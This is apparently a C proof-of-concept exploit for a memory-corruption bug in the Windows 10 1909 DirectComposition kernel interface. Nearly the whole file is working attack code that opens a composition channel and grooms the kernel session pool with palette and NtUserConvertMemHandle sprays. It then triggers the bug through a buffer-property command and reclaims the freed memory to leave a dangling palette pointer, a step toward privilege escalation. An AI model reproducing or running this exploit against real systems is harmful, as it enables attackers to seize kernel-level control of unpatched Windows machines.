//Target OS version : cn_windows_10_business_editions_version_1909_x64_dvd_0ca83907

#include <stdio.h>
#include <tchar.h>
#include <windows.h>
#include <winternl.h>
#include <strsafe.h>
#include <assert.h>
#include <conio.h>

#pragma warning(disable : 4311)
#pragma warning(disable : 4302)

enum DCPROCESSCOMMANDID
{
	nCmdProcessCommandBufferIterator,
	nCmdCreateResource,
	nCmdOpenSharedResource,
	nCmdReleaseResource,
	nCmdGetAnimationTime,
	nCmdCapturePointer,
	nCmdOpenSharedResourceHandle,
	nCmdSetResourceCallbackId,
	nCmdSetResourceIntegerProperty,
	nCmdSetResourceFloatProperty,
	nCmdSetResourceHandleProperty,
	nCmdSetResourceHandleArrayProperty,
	nCmdSetResourceBufferProperty,
	nCmdunkown,
	nCmdSetResourceReferenceArrayProperty,
	nCmdSetResourceAnimationProperty,
	nCmdSetResourceDeletedNotificationTag,
	nCmdAddVisualChild,
	nCmdRedirectMouseToHwnd,
	nCmdSetVisualInputSink,
	nCmdRemoveVisualChild
};

struct CREATE_RESOURCE
{
	DCPROCESSCOMMANDID Command;
	DWORD hResource;
	ULONG ResourceType;
	ULONG bShare;
};

struct SET_BUFFER_PROPERTY
{
	DCPROCESSCOMMANDID Command;
	DWORD hResource;
	ULONG flag;
	ULONG BufferSize;
};

extern "C" NTSTATUS
NTAPI
NtDCompositionCreateChannel(
	OUT PHANDLE pArgChannelHandle,
	IN OUT PSIZE_T pArgSectionSize,
	OUT PVOID * pArgSectionBaseMapInProcess);

extern "C" NTSTATUS
NTAPI
NtDCompositionProcessChannelBatchBuffer(
	IN HANDLE hChannel,
	IN DWORD dwArgStart,
	OUT PDWORD pOutArg1,
	OUT PDWORD pOutArg2);

typedef HANDLE(WINAPI* ZwUserConvertMemHandle)(BYTE* buf, DWORD size);
ZwUserConvertMemHandle pfnUserConvertMemHandle = 0;
HANDLE AllocateOnSessionPool(unsigned int size)
{
	if (!pfnUserConvertMemHandle)
	{
		pfnUserConvertMemHandle = (ZwUserConvertMemHandle)GetProcAddress(LoadLibraryA("win32u.dll"), "NtUserConvertMemHandle");
		if (!pfnUserConvertMemHandle)
		{
			// on win8.1 this function is located in user32.dll
			pfnUserConvertMemHandle = (ZwUserConvertMemHandle)GetProcAddress(LoadLibraryA("user32.dll"), "NtUserConvertMemHandle");
			if (!pfnUserConvertMemHandle)
			{
				printf("could not find win32u!NtUserConvertMemHandle. exiting.\n");
				return INVALID_HANDLE_VALUE;
			}
		}
	}

	int alloc_size = size - 0x14;
	BYTE* buffer = (BYTE*)malloc(alloc_size);
	memset(buffer, 0x41, alloc_size);
	HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, size);
	BYTE* buf = (BYTE*)GlobalLock(hMem);
	memcpy(buf, buffer, alloc_size);
	HANDLE hMem2 = pfnUserConvertMemHandle(buf, alloc_size);
	GlobalUnlock(hMem);
	return hMem;
}

HPALETTE createPaletteofSize(int size)
{
	if (size <= 0x90)
	{
		printf("bad size! can't allocate palette of size < 0x90!\n");
		return 0;
	}
	int pal_cnt = (size - 0x4) / 4;
	int palsize = sizeof(LOGPALETTE) + (pal_cnt - 1) * sizeof(PALETTEENTRY);
	LOGPALETTE* lPalette = (LOGPALETTE*)malloc(palsize);
	memset(lPalette, 0x4, palsize);
	lPalette->palNumEntries = pal_cnt;
	lPalette->palVersion = 0x300;
	return CreatePalette(lPalette);
}

int main(int argc, TCHAR* argv[])
{
	HANDLE hChannel;
	NTSTATUS ntStatus;
	PVOID pMappedAddress = NULL;
	SIZE_T SectionSize = 0x1000;
	DWORD dwArg1, dwArg2;
	DWORD hResource = 1;
	DWORD szBuff[0x12] = {
		0x00000003,
		0x00000008,
	};
	HPALETTE Palettes[0x800];

	//Create Channel
	LoadLibrary(TEXT("user32"));
	ntStatus = NtDCompositionCreateChannel(&hChannel, &SectionSize, &pMappedAddress);
	if (!NT_SUCCESS(ntStatus))
	{
		printf("NtDCompositionCreateChannel fail, error: %X\n", ntStatus);
		return 0;
	}
	printf("NtDCompositionCreateChannel success, hChannel: %llX, SectionSize: %llX, pMaappedAddress: %llX\n", hChannel, SectionSize, pMappedAddress);

	//Create Resources
	((CREATE_RESOURCE*)pMappedAddress)->Command = nCmdCreateResource;
	((CREATE_RESOURCE*)pMappedAddress)->hResource = hResource;
	((CREATE_RESOURCE*)pMappedAddress)->ResourceType = 0x58;
	((CREATE_RESOURCE*)pMappedAddress)->bShare = FALSE;
	ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);
	if (!NT_SUCCESS(ntStatus))
	{
		printf("NtDCompositionProcessChannelBatchBuffer nCmdCreateResource fail, error: %X\n", ntStatus);
		return 0;
	}
	hResource++;

	((CREATE_RESOURCE*)pMappedAddress)->Command = nCmdCreateResource;
	((CREATE_RESOURCE*)pMappedAddress)->hResource = hResource;
	((CREATE_RESOURCE*)pMappedAddress)->ResourceType = 0x58;
	((CREATE_RESOURCE*)pMappedAddress)->bShare = FALSE;
	ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);
	if (!NT_SUCCESS(ntStatus))
	{
		printf("NtDCompositionProcessChannelBatchBuffer nCmdCreateResource fail, error: %X\n", ntStatus);
		return 0;
	}
	hResource++;

	//use palette to do pool fengshui to make 0xc000 bytes hole in memory
	for (int i = 0; i < 0x800; i++)
	{
		Palettes[i] = createPaletteofSize(0xBFF0);
	}

	for (int i = 0x100; i < 0x800; i += 0x100)
	{
		DeleteObject(Palettes[i]);
	}

	//create a 0xc000 memory allocation which will locate in pool fengshui hole
	for (int i = 0; i < 0xC01; i++)
	{
		((SET_BUFFER_PROPERTY*)pMappedAddress)->Command = nCmdSetResourceBufferProperty;
		((SET_BUFFER_PROPERTY*)pMappedAddress)->hResource = 2;
		((SET_BUFFER_PROPERTY*)pMappedAddress)->flag = 0x40;
		((SET_BUFFER_PROPERTY*)pMappedAddress)->BufferSize = 0x800;
		memcpy((PUCHAR)pMappedAddress + 0x10, szBuff, sizeof(szBuff));
		ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x810, &dwArg1, &dwArg2);
		if (!NT_SUCCESS(ntStatus))
		{
			printf("NtDCompositionProcessChannelBatchBuffer nCmdSetResourceBufferProperty fail, error: %X\n", ntStatus);
			return 0;
		}
	}

	//spray 0x400 resources
	for (int i = 0; i < 0x1000; i++)
	{
		AllocateOnSessionPool(0xff0);
	}

	for (int i = 1; i < 0x3FF; i++)
	{
		((CREATE_RESOURCE*)pMappedAddress)->Command = nCmdCreateResource;
		((CREATE_RESOURCE*)pMappedAddress)->hResource = hResource;
		((CREATE_RESOURCE*)pMappedAddress)->ResourceType = 0x64;
		((CREATE_RESOURCE*)pMappedAddress)->bShare = FALSE;
		ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);
		if (!NT_SUCCESS(ntStatus))
		{
			printf("NtDCompositionProcessChannelBatchBuffer nCmdCreateResource fail, error: %X\n", ntStatus);
			return 0;
		}
		hResource++;
	}

	//create one more resource, two 0x2000 bytes object pointer tables will be freed and two new 0x4000 bytes object pointer tables will be allocated
	((CREATE_RESOURCE*)pMappedAddress)->Command = nCmdCreateResource;
	((CREATE_RESOURCE*)pMappedAddress)->hResource = hResource;
	((CREATE_RESOURCE*)pMappedAddress)->ResourceType = 0x58;
	((CREATE_RESOURCE*)pMappedAddress)->bShare = FALSE;
	ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);
	if (!NT_SUCCESS(ntStatus))
	{
		printf("NtDCompositionProcessChannelBatchBuffer nCmdCreateResource fail, error: %X\n", ntStatus);
		return 0;
	}
	hResource++;

	for (int i = 0; i < 0x1000; i++)
	{
		AllocateOnSessionPool(0x3FF0);
	}

	//trigger the vulnerability with buffer size is 0x1000,it will release the resource with 0xc000 memory
	((SET_BUFFER_PROPERTY*)pMappedAddress)->Command = nCmdSetResourceBufferProperty;
	((SET_BUFFER_PROPERTY*)pMappedAddress)->hResource = 1;
	((SET_BUFFER_PROPERTY*)pMappedAddress)->flag = 0x14;
	((SET_BUFFER_PROPERTY*)pMappedAddress)->BufferSize = 0x800;
	memcpy((PUCHAR)pMappedAddress + 0x10, szBuff, sizeof(szBuff));
	ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x810, &dwArg1, &dwArg2);
	if (!NT_SUCCESS(ntStatus))
	{
		printf("NtDCompositionProcessChannelBatchBuffer nCmdSetResourceBufferProperty fail, error: %X\n", ntStatus);
	}

	//Spray some palette to allocate the memory we just freed
	for (int i = 0; i < 0x40; i++)
	{
		Palettes[i] = createPaletteofSize(0x3FF0);
	}

	for (int i = 0xC01; i < 0x1001; i++)
	{
		//free the palette data. Then we have a palette with a dangling data pointer.
		((SET_BUFFER_PROPERTY*)pMappedAddress)->Command = nCmdSetResourceBufferProperty;
		((SET_BUFFER_PROPERTY*)pMappedAddress)->hResource = 2;
		((SET_BUFFER_PROPERTY*)pMappedAddress)->flag = 0x40;
		((SET_BUFFER_PROPERTY*)pMappedAddress)->BufferSize = 0x800;
		memcpy((PUCHAR)pMappedAddress + 0x10, szBuff, sizeof(szBuff));
		ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x810, &dwArg1, &dwArg2);
		if (!NT_SUCCESS(ntStatus))
		{
			printf("NtDCompositionProcessChannelBatchBuffer nCmdSetResourceBufferProperty fail, error: %X\n", ntStatus);
		}
	}

	system("pause");
	return 0;
}
